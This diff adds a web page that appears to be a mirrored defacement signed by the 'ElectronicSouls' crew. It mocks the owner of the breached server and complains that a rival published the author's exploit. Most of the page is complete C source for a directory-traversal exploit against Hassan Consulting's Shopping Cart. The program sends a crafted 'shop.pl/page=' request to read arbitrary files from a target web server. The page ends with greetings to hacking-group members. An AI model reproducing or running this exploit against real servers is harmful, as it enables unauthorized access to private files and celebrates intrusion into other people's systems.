@@ -1,0 +1,133 @@
+<html>
+<head>
+   <title>--[ElectronicSouls]--</title>
+</head>
+<body text="#00FF00" bgcolor="#000000" link="#0000EE" vlink="#551A8B" alink="#FF0000">
+<font face="Courier New,Courier"><font color="#FFFFFF"><font size=+1>_______________________________________________</font></font></font>
+<br><b><font face="Courier New,Courier"><font color="#FFFFFF"><font size=+2>&nbsp;
+/* Your cute b0x is mine now ! */</font></font></font></b>
+<br><font face="Courier New,Courier"><font color="#FFFFFF"><font size=+1>better
+secure it u moron,sorry but i'm pissed,</font></font></font>
+<br><font face="Courier New,Courier"><font color="#FFFFFF"><font size=+1>..i
+still made a backup of ur crap..</font></font></font>
+<br><font face="Courier New,Courier"><font color="#FFFFFF"><font size=+1>_______________________________________________</font></font></font>
+<br><font face="Tahoma"><font size=+1></font></font>&nbsp;<font face="Tahoma"><font size=+1></font></font>
+<p><font face="Tahoma"><font size=+1>|-- i wanna use this webspace to say
+FUCK YOU !! --|</font></font>
+<br><font face="Tahoma"><font size=+1>|-- to all u kiddie's who steal others
+codes ! ----------|</font></font>
+<br><font face="Tahoma"><font size=+1></font></font>&nbsp;<font face="Tahoma"></font>
+<p><font face="Tahoma">Yo at first i am really pissed that <font color="#FFFFFF">my
+exploit</font> is now on SecurityFocus.com</font>
+<br><font face="Tahoma">i don't want to name this gay ass, i don't want
+to get him some attention,</font>
+<br><font face="Tahoma">but however, if u see <font color="#FF0000">the
+hassan consultings shopping card Exploit</font>,</font>
+<br><font face="Tahoma"><font color="#FF0000">i discovered it</font>..
+thats what u get when u share 0days :P</font>
+<br><font face="Tahoma">Its not a special exploit, but anyway it was my
+work !!</font><font face="Tahoma"></font>
+<p>-
+<br><font face="Tahoma">Here is the original code (besides the Banner is
+changed a bit) :</font>
+<br>-
+<p><font face="Tahoma"><font color="#FFFFFF">------------ [Begin Brain0day.c]
+------------</font></font>
+<br>&nbsp;
+<p><font face="Tahoma">/*********************************************************\</font>
+<br><font face="Tahoma">&nbsp;*&nbsp; !! ELECTRONIC-SOULS CREW ONLY !!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+*</font>
+<br><font face="Tahoma">&nbsp;*&nbsp; !!&nbsp;&nbsp;&nbsp; - DO NOT DISTRIBUTE&nbsp;&nbsp;&nbsp;&nbsp;
+!!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+*</font>
+<br><font face="Tahoma">&nbsp;*&nbsp; !! IF U SEE THIS EXPLOIT ON SECURITYFOCUS,
+I FOUND&nbsp;&nbsp; *</font>
+<br><font face="Tahoma">&nbsp;*&nbsp; !! THIS EXPLOIT b4 THIS GAY ASS POSTET
+IT, SO STFU&nbsp;&nbsp; *</font>
+<br><font face="Tahoma">&nbsp;*&nbsp; -----------------------------------------------------*</font>
+<br><font face="Tahoma">&nbsp;*&nbsp; Exploit Hassan Consulting's Shopping
+Cart.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *</font>
+<br><font face="Tahoma">&nbsp;*&nbsp; -----------------------------------------------------*</font>
+<br><font face="Tahoma">&nbsp;*&nbsp; vulnerable to a ../.. exploit,u can
+get&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+*</font>
+<br><font face="Tahoma">&nbsp;*&nbsp; access to every file on the vulnerable
+server !&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *</font>
+<br><font face="Tahoma">&nbsp;*&nbsp; Exploit discovered by BrainStorm&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+*</font>
+<br><font face="Tahoma">&nbsp;*&nbsp; Tested on BSDi 3.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+*</font>
+<br><font face="Tahoma">&nbsp;*&nbsp; Exploit Coded by v0id - da_v0id@antionline.org&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+*</font>
+<br><font face="Tahoma">\*********************************************************/</font>
+<br><font face="Tahoma"></font>&nbsp;<font face="Tahoma"></font>
+<p><font face="Tahoma">#include &lt;stdio.h></font>
+<br><font face="Tahoma">#include &lt;stdlib.h></font>
+<br><font face="Tahoma">#include &lt;errno.h></font>
+<br><font face="Tahoma">#include &lt;string.h></font>
+<br><font face="Tahoma">#include &lt;netdb.h></font>
+<br><font face="Tahoma">#include &lt;sys/types.h></font>
+<br><font face="Tahoma">#include &lt;netinet/in.h></font>
+<br><font face="Tahoma">#include &lt;sys/socket.h></font><font face="Tahoma"></font>
+<p><font face="Tahoma">#define BOLD "\033[00;01m"</font>
+<br><font face="Tahoma">#define RED "\033[01;31m"</font>
+<br><font face="Tahoma">#define NORM "\033[00;00m"</font>
+<br><font face="Tahoma">#define GREEN "\033[01;32m"</font><font face="Tahoma"></font>
+<p><font face="Tahoma">int main(int argc, char **argv[])</font>
+<br><font face="Tahoma">{</font>
+<br><font face="Tahoma">&nbsp; struct sockaddr_in sin;</font>
+<br><font face="Tahoma">&nbsp; struct hostent *host;</font>
+<br><font face="Tahoma">&nbsp; char buf[8192];</font>
+<br><font face="Tahoma">&nbsp; int sock, rt, len;</font><font face="Tahoma"></font>
+<p><font face="Tahoma">&nbsp; if (argc != 3) {</font>
+<br><font face="Tahoma">&nbsp;&nbsp;&nbsp; printf(BOLD"Usage: %s &lt;host>
+&lt;string>\n"NORM, argv[0]);</font>
+<br><font face="Tahoma">&nbsp; }</font>
+<br><font face="Tahoma">&nbsp; host = gethostbyname((void *)argv[1]);</font>
+<br><font face="Tahoma">&nbsp; sock = socket(AF_INET, SOCK_STREAM, 0);</font><font face="Tahoma"></font>
+<p><font face="Tahoma">&nbsp; bzero(&amp;(sin.sin_zero), 8);</font>
+<br><font face="Tahoma">&nbsp; sin.sin_family = AF_INET;</font>
+<br><font face="Tahoma">&nbsp; sin.sin_addr.s_addr = htonl(INADDR_ANY);</font>
+<br><font face="Tahoma">&nbsp; sin.sin_addr.s_addr = ((struct in_addr *)(host->h_addr))->s_addr;</font>
+<br><font face="Tahoma">&nbsp; sin.sin_port = htons(80);</font><font face="Tahoma"></font>
+<p><font face="Tahoma">&nbsp; rt = connect(sock, (void *)&amp;sin, sizeof(sin));</font>
+<br><font face="Tahoma">&nbsp; if (rt == -1) {</font>
+<br><font face="Tahoma">&nbsp;&nbsp;&nbsp; perror(RED"connect"NORM);</font>
+<br><font face="Tahoma">&nbsp;&nbsp;&nbsp; exit(1);</font>
+<br><font face="Tahoma">&nbsp; }</font><font face="Tahoma"></font>
+<p><font face="Tahoma">&nbsp; printf(GREEN"Connected to %s\n"NORM, argv[1]);</font><font face="Tahoma"></font>
+<p><font face="Tahoma">&nbsp; memset(&amp;buf, 0, sizeof(buf));</font>
+<br><font face="Tahoma">&nbsp; sprintf(buf, "GET /cgi-local/shop.pl/page=%s
+HTTP/1.0\n\n", argv[2]);</font>
+<br><font face="Tahoma">&nbsp; printf(GREEN"Sending %s\n"NORM, argv[2]);</font>
+<br><font face="Tahoma">&nbsp; send(sock, buf, sizeof(buf), 0);</font><font face="Tahoma"></font>
+<p><font face="Tahoma">&nbsp; while (1) {</font>
+<br><font face="Tahoma">&nbsp;&nbsp;&nbsp; memset(&amp;buf, 0, sizeof(buf));</font>
+<br><font face="Tahoma">&nbsp;&nbsp;&nbsp; len = sizeof(buf);</font>
+<br><font face="Tahoma">&nbsp;&nbsp;&nbsp; rt = read(sock, &amp;buf, len);</font>
+<br><font face="Tahoma">&nbsp;&nbsp;&nbsp; if (rt &lt;= 0) exit(0);</font>
+<br><font face="Tahoma">&nbsp;&nbsp;&nbsp; printf(GREEN"%s\n"NORM, buf);</font>
+<br><font face="Tahoma">&nbsp;</font>
+<br><font face="Tahoma">&nbsp; }</font>
+<br><font face="Tahoma">&nbsp;printf(NORM"\n");</font>
+<br><font face="Tahoma">}</font><font face="Tahoma"></font>
+<p><font face="Tahoma">/* ElectronicSouls */</font>
+<br><font face="Tahoma"></font>&nbsp;<font face="Tahoma"></font>
+<p><font face="Tahoma"><font color="#FFFFFF">------------ [End Brain0day.c]
+------------</font></font>
+<br><font face="Tahoma"></font>&nbsp;<font face="Tahoma"></font>
+<p><b><font face="Tahoma">Greetings:</font></b>
+<br><font face="Tahoma">RobBbot, LordLunatic, IT_FRESH, FreQ, v0id, s0lar,
+FiberOptik, websk8ter,</font>
+<br><font face="Tahoma">le0n, doom, modify, Internexus, SectorX, fiasco,
+potgirl ;) , JW23, ghQst,</font>
+<br><font face="Tahoma">philer, warlord1101, KeltecSub9, derf-, ttyp123,
+FREAK88, CraigTM, zoltrax,</font>
+<br><font face="Tahoma">OveRRide, [Kr-0N-1K], sturm.. and #RSH , #!0x7f
+, #ElectronicSouls</font>
+<br><font face="Tahoma">..on irc.dugnet.net</font>
+<br><font face="Tahoma"></font>&nbsp;<font face="Tahoma"></font>
+<p><font face="Tahoma">[EOF]</font>
+</body>
+</html>
+<!-- www.attrition.org web hack mirror - watermark or something -->
